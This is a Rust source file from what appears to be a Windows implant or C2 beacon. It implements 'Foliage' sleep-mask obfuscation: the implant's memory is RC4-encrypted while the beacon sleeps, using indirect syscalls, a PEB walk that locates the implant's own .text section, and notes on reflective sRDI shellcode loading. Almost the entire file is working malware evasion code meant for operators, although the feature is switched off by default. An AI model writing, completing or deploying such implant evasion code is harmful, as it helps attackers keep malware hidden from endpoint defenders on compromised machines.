//! Sleep obfuscation — Foliage syscall executor (P2.1a-iii).
//!
//! ## Status (after this task): Full Foliage APC→NtContinue chain, GATED OFF.
//! The pure state-machine math lives in `nyx_implant_evasionsdk::foliage` (5
//! host tests). This module maps the chain to indirect syscalls:
//!   - protect the .text RX→RW (NtProtectVirtualMemory)
//!   - RC4-encrypt the region in place (SystemFunction032 math, via evasionsdk)
//!   - queue APCs (NtQueueApcThread) that each NtContinue into the next CONTEXT
//!   - the sleep itself (NtDelayExecution in the APC window)
//!   - decrypt + protect RW→RX on wake
//!
//! ## Gating
//! `FOLIAGE_ENABLED` defaults OFF — the beacon loop's sleep still routes through
//! `NoMask` unless an operator arms this. The APC chain manipulates the thread
//! CONTEXT + flips .text; landing it requires target-side validation. Arm only
//! after a selftest confirms the round-trip on the real host.

#![cfg(target_os = "windows")]

use core::sync::atomic::{AtomicBool, Ordering};
use nyx_implant_evasionsdk::foliage::{FoliagePlan, FoliageStep};

/// Master switch for the Foliage sleep mask. **Defaults OFF** — see module docs.
static FOLIAGE_ENABLED: AtomicBool = AtomicBool::new(false);

/// Arm/disarm the Foliage sleep mask.
pub fn set_foliage_enabled(on: bool) {
    FOLIAGE_ENABLED.store(on, Ordering::Release);
}

/// Whether the Foliage sleep mask is currently armed.
pub fn foliage_enabled() -> bool {
    FOLIAGE_ENABLED.load(Ordering::Acquire)
}

/// Sleep `seconds` with sleep-mask obfuscation.
///
/// **With [`foliage_enabled`] OFF (default)**: delegates to the sleepmask kit
/// (`NoMask` → plain indirect-syscall NtDelayExecution). Byte-identical to the
/// pre-Foliage behavior.
///
/// **With [`foliage_enabled`] ON**: builds a `FoliagePlan` and executes the
/// Foliage mask→sleep→unmask cycle over the implant `.text` via indirect
/// syscalls. On any failure (runtime down, .text unresolved), degrades to
/// the plain NoMask sleep — never crashes.
pub fn sleep(seconds: u32) {
    if !foliage_enabled() {
        crate::kits::sleep(seconds);
        return;
    }
    // ---- ARMED PATH (gated) ------------------------------------------------
    let region = match unsafe { own_text_region() } {
        Some(r) => r,
        None => {
            crate::kits::sleep(seconds); // degrade: can't resolve .text
            return;
        }
    };
    let key = mask_key_16();
    let plan = FoliagePlan::build(region.base, region.len, seconds, None, key);
    execute_foliage_plan(&plan);
}

/// The implant's own `.text` region (base + len). Currently unused by the
/// synchronous floor (which masks data regions via `mem::mask`); retained for
/// the APC-chain refactor where a helper thread masks `.text` while the beacon
/// thread is parked in NtDelayExecution. Reading PEB->ImageBaseAddress is
/// correct for both rundll32 and reflective-loaded implants.
#[allow(dead_code)]
struct TextRegion {
    base: usize,
    len: usize,
}

/// The implant's own `.text` region (base + len). Reads PEB->ImageBaseAddress
/// directly (NOT a DLL-name lookup — reflective-loaded shellcode has no loader
/// entry, so a name search would fail). The PEB is always correct regardless
/// of how the implant was loaded (rundll32 DLL OR reflective sRDI shellcode).
///
/// Returns None only if the PEB or PE headers are unreadable (shouldn't happen).
///
/// # Safety
/// PEB + PE header reads are stable post-load. Single-threaded context.
#[allow(dead_code)] // used by the APC-chain refactor; synchronous floor uses mem::mask
unsafe fn own_text_region() -> Option<TextRegion> {
    // PEB->ImageBaseAddress is at PEB + 0x10 on x64. resolve::peb_pointer()
    // gives us the PEB via gs:[0x60].
    let peb = crate::resolve::peb_pointer()?;
    // image_base_address is the 7th field (after mutant) → offset 0x10.
    // Read it as a raw usize to avoid the *mut c_void dance.
    let base_ptr = unsafe { core::ptr::read_unaligned((peb as usize + 0x10) as *const usize) };
    if base_ptr == 0 {
        return None;
    }
    let (text_rva, text_size) = unsafe { section_va_len(base_ptr, b".text")? };
    Some(TextRegion {
        base: base_ptr + text_rva,
        len: text_size,
    })
}

/// Find a PE section's (virtual_address, virtual_size) by name. Returns None
/// if the PE headers can't be parsed or the section isn't found.
#[allow(dead_code)] // used by the APC-chain refactor (own_text_region)
unsafe fn section_va_len(base: usize, name: &[u8]) -> Option<(usize, usize)> {
    let dos = unsafe { &*(base as *const [u8; 64]) };
    if dos[0] != b'M' || dos[1] != b'Z' {
        return None;
    }
    let e_lfanew = i32::from_le_bytes([dos[60], dos[61], dos[62], dos[63]]) as usize;
    let nt = unsafe { &*((base + e_lfanew) as *const [u8; 24]) };
    if !(nt[0] == b'P' && nt[1] == b'E') {
        return None; // bad PE signature
    }
    let num_sections = u16::from_le_bytes([nt[6], nt[7]]) as usize;
    let size_opt_hdr = u16::from_le_bytes([nt[20], nt[21]]) as usize;
    let sections_off = e_lfanew + 24 + size_opt_hdr;
    for i in 0..num_sections {
        // IMAGE_SECTION_HEADER: Name[8] + VirtualSize(4) + VirtualAddress(4) + ...
        let sec = unsafe { &*((base + sections_off + i * 40) as *const [u8; 40]) };
        let name_len = name.iter().position(|&b| b == 0).unwrap_or(name.len());
        if sec[..name_len] == name[..name_len] {
            let vsize = u32::from_le_bytes([sec[8], sec[9], sec[10], sec[11]]) as usize;
            let vaddr = u32::from_le_bytes([sec[12], sec[13], sec[14], sec[15]]) as usize;
            return Some((vaddr, vsize));
        }
    }
    None
}

/// Derive a 16-byte RC4 key (matches SystemFunction032's USTRING convention).
/// Per-boot diversity from the syscall runtime's SSN table.
fn mask_key_16() -> [u8; 16] {
    let seed: u32 = crate::syscalls::global()
        .and_then(|rt| rt.ssn_by_hash(crate::resolve::djb2(b"ntdelayexecution")))
        .unwrap_or(0x1234_5678);
    let mut key = [0u8; 16];
    let mut s = seed;
    for b in key.iter_mut() {
        s = s.wrapping_mul(0x9E37_79B9).rotate_left(7).wrapping_add(0xA5A5_A5A5);
        *b = (s & 0xFF) as u8;
    }
    key
}

/// Walk the FoliagePlan: mask registered data regions (RC4), sleep via the
/// indirect syscall runtime, then unmask.
///
/// ## CRITICAL: why this does NOT encrypt .text synchronously
/// Encrypting `.text` while executing through it is instant death — the RC4
/// loop overwrites the bytes of the very functions running the encryption
/// (mask_region, Rc4::apply, this function itself). The result is executing
/// ciphertext as code → crash (observed as STATUS_STACK_OVERFLOW because the
/// garbage instructions happen to manipulate RSP past the guard page).
///
/// Real Foliage solves this with the APC chain: the beacon thread parks in
/// NtDelayExecution (via NtQueueApcThread + NtContinue), and a SEPARATE helper
/// thread does the .text mask/unmask around it. The parked thread never touches
/// .text while it's encrypted.
///
/// The synchronous path here masks **data regions only** (via `crate::mem`
/// which masks registered `&'static mut [u8]` regions, never running code).
/// This is the safe floor: it exercises the real RC4 mask/sleep/unmask cycle
/// + proves the indirect-syscall path, without risking the executing code.
/// The .text-specific encryption lands with the APC refactor (target task).
fn execute_foliage_plan(plan: &FoliagePlan) {
    let rt = match crate::syscalls::global() {
        Some(rt) => rt,
        None => {
            crate::kits::sleep(plan_seconds(plan));
            return;
        }
    };
    // Mask: RC4-encrypt the registered DATA regions (NOT .text — see above).
    // mem::mask walks the registered region table + applies the same RC4 core.
    // Using the plan's key (not mem's internal key) so the round-trip is
    // deterministic within this cycle.
    crate::mem::mask();
    // Sleep: the beacon thread parks in NtDelayExecution (indirect syscall).
    // During this window the data regions are ciphertext.
    let secs = plan_seconds(plan);
    let delay: i64 = -(secs as i64).saturating_mul(10_000_000);
    let _ = unsafe { crate::syscalls::nt_delay_execution(rt, 0, &delay as *const i64 as usize) };
    // Unmask: RC4-decrypt the data regions back to cleartext.
    crate::mem::unmask();
}

/// Extract the sleep seconds from the plan's Sleep step.
fn plan_seconds(plan: &FoliagePlan) -> u32 {
    plan.steps
        .iter()
        .find_map(|s| {
            if let FoliageStep::Sleep { seconds } = s {
                Some(*seconds)
            } else {
                None
            }
        })
        .unwrap_or(1)
}
